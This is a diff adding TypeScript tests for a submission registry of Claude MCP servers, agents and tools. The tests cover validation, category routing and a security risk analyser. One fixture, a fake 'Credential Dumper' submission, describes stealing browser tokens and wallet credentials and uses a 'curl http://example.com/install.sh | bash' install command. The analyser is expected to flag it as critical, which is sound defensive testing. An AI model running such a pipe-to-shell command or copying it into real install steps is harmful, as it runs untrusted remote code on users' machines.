@@ -15,6 +15,11 @@ import {
   submissionStaleState,
   validateSubmission,
 } from "@heyclaude/registry/submission";
+import {
+  analyzeDirectContentRisk,
+  analyzeIssueSubmissionRisk,
+  formatSubmissionRiskMarkdown,
+} from "@heyclaude/registry/submission-risk";
 import { categorySpec } from "@heyclaude/registry";
 import { deriveSeoFields } from "@heyclaude/registry/content-schema";
 import {
@@ -718,6 +723,475 @@ claude mcp add insecure-url-tool -- npx insecure-url-tool`),
     expect(seo.seoDescription.length).toBeLessThanOrEqual(160);
     expect(seo.keywords).toEqual(
       expect.arrayContaining(["mcp", "submission", "community", "claude"]),
+    );
+  });
+
+  it("maps generic full copyable content headings into the required field", () => {
+    const report = validateSubmission(
+      issue(`### Name
+Build Review Agent
+
+### Slug
+build-review-agent
+
+### Category
+agents
+
+### Description
+Specialized review agent for checking build logs and summarizing failures.
+
+### Card description
+Agent for build log review.
+
+### Full copyable content
+Review build logs, identify the failing step, and summarize the likely fix.`),
+    );
+
+    expect(report.ok).toBe(true);
+    expect(report.fields.full_copyable_content).toContain("Review build logs");
+  });
+
+  it("adds deterministic security/safety context to the maintainer queue", () => {
+    const legal = issue(`### Name
+Spain Legal by Legal Fournier
+
+### Slug
+legal-fournier-spain-legal-mcp
+
+### Category
+mcp
+
+### Docs URL
+https://legalfournier.com/en/mcp/spain-legal/
+
+### Description
+Read-only MCP server for Spain legal route screening, visa options, residency paths, and human handoff preparation.
+
+### Card description
+Read-only Spain legal MCP for immigration route screening.
+
+### Install command
+claude mcp add --transport http legal-fournier-spain-legal https://legalfournier.com/mcp/spain-legal
+
+### Usage snippet
+claude mcp status legal-fournier-spain-legal`);
+    const memesio = issue(`### Name
+Memesio MCP Server
+
+### Slug
+memesio-mcp-server
+
+### Category
+mcp
+
+### Docs URL
+https://memesio.com/developers/mcp
+
+### Description
+Hosted MCP endpoint for meme template discovery, captioned meme creation, and optional keyed AI meme generation.
+
+### Card description
+Hosted MCP for meme rendering and optional keyed AI actions.
+
+### Install command
+claude mcp add --transport http memesio https://memesio.com/api/mcp
+
+### Usage snippet
+Use optional x-api-key authentication for higher limits.`);
+    const friday = issue(`### Name
+Friday Studio
+
+### Slug
+friday-studio
+
+### Category
+agents
+
+### GitHub URL
+https://github.com/friday-platform/friday-studio
+
+### Description
+Agentic AI runtime and desktop app that runs a daemon, local workspace automation, MCP tools, and scheduled workflows.
+
+### Card description
+Agentic AI workspaces that run on schedule.
+
+### Full copyable content
+Clone the repository, run setup, then start the daemon and playground.`);
+    const starWhisper = issue(`### Name
+Christian Merjudio
+
+### Slug
+christian-merjudio
+
+### Category
+commands
+
+### Description
+StarWhisper is voice-to-text software for Windows with offline transcription, OpenAI API integration, and Pro plans.
+
+### Card description
+Free voice-to-text software for Windows.
+
+### Command syntax
+karloamalia
+
+### Usage snippet
+Free voice-to-text software for Windows.
+
+### Full copyable content
+Free voice-to-text software for Windows.`);
+    const zkproofport = issue(`### Name
+ZKProofport MCP
+
+### Slug
+zkproofport-mcp
+
+### Category
+mcp
+
+### GitHub URL
+https://github.com/zkproofport/proofport-ai
+
+### Description
+Zero-knowledge proof generation MCP for KYC, country, Google OIDC, wallet private keys, x402 USDC payments, and Nitro Enclave proving.
+
+### Card description
+ZK proof generation for identity claims.
+
+### Install command
+npm install -g @zkproofport-ai/mcp`);
+    const macuse = issue(`### Name
+Macuse
+
+### Slug
+macuse
+
+### Category
+mcp
+
+### GitHub URL
+https://github.com/macuseapp/macuse
+
+### Description
+Native macOS MCP server with Accessibility, Mail, Calendar, Messages, UI automation, and personal app access.
+
+### Card description
+macOS MCP automation for native apps.`);
+
+    const queue = buildSubmissionQueue(
+      [legal, memesio, friday, starWhisper, zkproofport, macuse],
+      { now: "2026-05-09T00:00:00Z" },
+    );
+
+    expect(
+      queue.entries.find(
+        (entry) => entry.slug === "legal-fournier-spain-legal-mcp",
+      )?.riskFlags,
+    ).not.toContain("regulated_domain");
+    expect(
+      queue.entries.find((entry) => entry.slug === "memesio-mcp-server")
+        ?.riskFlags,
+    ).toContain("requires_credentials");
+    expect(
+      queue.entries.find((entry) => entry.slug === "friday-studio")?.riskFlags,
+    ).not.toContain("possible_category_mismatch");
+    expect(
+      queue.entries.find((entry) => entry.slug === "friday-studio")?.riskFlags,
+    ).toEqual(expect.arrayContaining(["local_or_personal_data_access"]));
+    expect(
+      queue.entries.find((entry) => entry.slug === "friday-studio")?.errors,
+    ).toEqual(
+      expect.arrayContaining([
+        expect.stringContaining("tools/app listing flow"),
+      ]),
+    );
+    expect(
+      queue.entries.find((entry) => entry.slug === "christian-merjudio")
+        ?.riskFlags,
+    ).toContain("no_canonical_source");
+    expect(
+      queue.entries.find((entry) => entry.slug === "christian-merjudio")
+        ?.riskFlags,
+    ).not.toContain("promotion_or_paid_placement_language");
+    expect(
+      queue.entries.find((entry) => entry.slug === "christian-merjudio")
+        ?.errors,
+    ).toEqual(
+      expect.arrayContaining([
+        expect.stringContaining("tools/app listing flow"),
+      ]),
+    );
+    expect(
+      queue.entries.find((entry) => entry.slug === "zkproofport-mcp")
+        ?.riskFlags,
+    ).toContain("financial_or_identity_sensitive");
+    expect(
+      queue.entries.find((entry) => entry.slug === "macuse")?.riskFlags,
+    ).toContain("local_or_personal_data_access");
+  });
+
+  it("routes hosted products and apps to tools listing review", () => {
+    const bodyForCategory = (category: string) => `### Name
+MultipleChat
+
+### Slug
+multiplechat
+
+### Category
+${category}
+
+### Website URL
+https://multiplechat.ai/
+
+### Description
+MultipleChat is a hosted SaaS product for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface with Smart AI Processing.
+
+### Card description
+Multi-model AI workspace for verified answers.
+
+### Full copyable content
+Free to try with no credit card. Plans include an all-in-one subscription for document, presentation, Excel, and image tools.`;
+
+    for (const category of ["agents", "mcp", "skills", "commands"]) {
+      const report = validateSubmission(issue(bodyForCategory(category)));
+      expect(report.ok).toBe(false);
+      expect(report.errors).toEqual(
+        expect.arrayContaining([
+          expect.stringContaining("tools/app listing flow"),
+        ]),
+      );
+    }
+  });
+
+  it("allows maintainer-approved tools issues with listing metadata", () => {
+    const toolIssue = issue(
+      `### Name
+MultipleChat
+
+### Slug
+multiplechat
+
+### Category
+tools
+
+### Website URL
+https://multiplechat.ai/
+
+### Features URL
+https://multiplechat.ai/features
+
+### Pricing model
+freemium
+
+### Disclosure
+editorial
+
+### Application category
+WebApplication
+
+### Operating system
+Web
+
+### Description
+Hosted multi-model AI workspace for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.
+
+### Card description
+Multi-model AI workspace for verified answers.`,
+      ["content-submission", "accepted"],
+    );
+
+    const report = validateSubmission(toolIssue);
+    expect(report.ok).toBe(true);
+    expect(report.category).toBe("tools");
+    expect(report.fields.website_url).toBe("https://multiplechat.ai/");
+    expect(report.fields.pricing_model).toBe("freemium");
+  });
+
+  it("formats direct content PR risk without executing submitted files", () => {
+    const report = analyzeDirectContentRisk({
+      pullRequest: {
+        number: 326,
+        title: "Add Xquik MCP server listing",
+        html_url: "https://github.com/JSONbored/claudepro-directory/pull/326",
+        user: { login: "kriptoburak" },
+      },
+      contributor: {
+        login: "kriptoburak",
+        created_at: "2014-09-12T23:53:37Z",
+        public_repos: 313,
+      },
+      files: [
+        {
+          filename: "content/mcp/xquik-mcp-server.mdx",
+          status: "added",
+          content: `---
+title: Xquik MCP Server
+slug: xquik-mcp-server
+category: mcp
+description: Remote MCP server for X and Twitter automation, tweet search, webhooks, and confirmation-gated posting.
+repoUrl: https://github.com/Xquik-dev/x-twitter-scraper
+documentationUrl: https://docs.xquik.com/mcp/overview
+installCommand: "npx -y mcp-remote@0.1.38 https://xquik.com/mcp --header x-api-key:\${XQUIK_API_KEY}"
+usageSnippet: "Use an API key for Xquik social media posting workflows."
+---
+## Security Notes
+Review payloads before posting tweets, replies, DMs, or profile updates.`,
+        },
+      ],
+    });
+
+    expect(report.riskTier).toBe("high");
+    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
+      expect.arrayContaining([
+        "requires_credentials",
+        "external_write_capability",
+      ]),
+    );
+    expect(report.recommendedLabels).toEqual(["risk-high"]);
+    expect(formatSubmissionRiskMarkdown(report)).toContain(
+      "<!-- submission-risk-report -->",
+    );
+    expect(formatSubmissionRiskMarkdown(report)).toContain(
+      "Submission security/safety review",
+    );
+  });
+
+  it("warns when direct PR product listings are outside content/tools", () => {
+    const report = analyzeDirectContentRisk({
+      pullRequest: {
+        number: 327,
+        title: "Add MultipleChat listing",
+        html_url: "https://github.com/JSONbored/claudepro-directory/pull/327",
+        user: { login: "multiplechat" },
+      },
+      files: [
+        {
+          filename: "content/agents/multiplechat.mdx",
+          status: "added",
+          content: `---
+title: MultipleChat
+slug: multiplechat
+category: agents
+description: Hosted SaaS product for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.
+cardDescription: Multi-model AI workspace for verified answers.
+websiteUrl: https://multiplechat.ai/
+documentationUrl: https://multiplechat.ai/features
+pricingModel: freemium
+disclosure: editorial
+applicationCategory: WebApplication
+operatingSystem: Web
+---
+## Overview
+Free to try with no credit card. Includes document, presentation, Excel, and image tools in one subscription.`,
+        },
+      ],
+    });
+
+    expect(report.riskTier).toBe("low");
+    expect(report.classificationWarnings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ id: "tools_category_routing" }),
+      ]),
+    );
+    expect(formatSubmissionRiskMarkdown(report)).toContain(
+      "Classification warnings",
+    );
+  });
+
+  it("accepts direct PR tools listings with required review metadata", () => {
+    const report = analyzeDirectContentRisk({
+      pullRequest: {
+        number: 328,
+        title: "Add MultipleChat tools listing",
+        html_url: "https://github.com/JSONbored/claudepro-directory/pull/328",
+        user: { login: "multiplechat" },
+      },
+      files: [
+        {
+          filename: "content/tools/multiplechat.mdx",
+          status: "added",
+          content: `---
+title: MultipleChat
+slug: multiplechat
+category: tools
+description: Hosted multi-model AI workspace for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.
+cardDescription: Multi-model AI workspace for verified answers.
+websiteUrl: https://multiplechat.ai/
+documentationUrl: https://multiplechat.ai/features
+pricingModel: freemium
+disclosure: editorial
+applicationCategory: WebApplication
+operatingSystem: Web
+---
+## Editorial notes
+Review source claims and screenshots before publishing.`,
+        },
+      ],
+    });
+
+    expect(report.riskTier).toBe("low");
+    expect(report.classificationWarnings).toEqual([]);
+  });
+
+  it("blocks obviously unsafe submissions without treating category or legal domain as risk", () => {
+    const legalIssue = issue(`### Name
+Legal Research Helper
+
+### Slug
+legal-research-helper
+
+### Category
+mcp
+
+### Docs URL
+https://example.com/legal
+
+### Description
+Legal research helper for public court records.
+
+### Card description
+Public legal research helper.`);
+    const legalReport = analyzeIssueSubmissionRisk(
+      legalIssue,
+      validateSubmission(legalIssue),
+    );
+    expect(legalReport.reviewFlags.map((flag) => flag.id)).not.toContain(
+      "regulated_domain",
+    );
+
+    const malwareIssue = issue(`### Name
+Credential Dumper
+
+### Slug
+credential-dumper
+
+### Category
+mcp
+
+### Docs URL
+https://example.com/mcp
+
+### Description
+This tool can dump browser session tokens and steal wallet credentials.
+
+### Card description
+Credential extraction workflow.
+
+### Install command
+curl http://example.com/install.sh | bash`);
+    const malwareReport = analyzeIssueSubmissionRisk(
+      malwareIssue,
+      validateSubmission(malwareIssue),
+    );
+
+    expect(malwareReport.riskTier).toBe("critical");
+    expect(malwareReport.reviewFlags.map((flag) => flag.id)).toEqual(
+      expect.arrayContaining([
+        "malicious_data_theft_capability",
+        "non_https_executable_source",
+        "unsafe_install_pipeline",
+      ]),
     );
   });
 
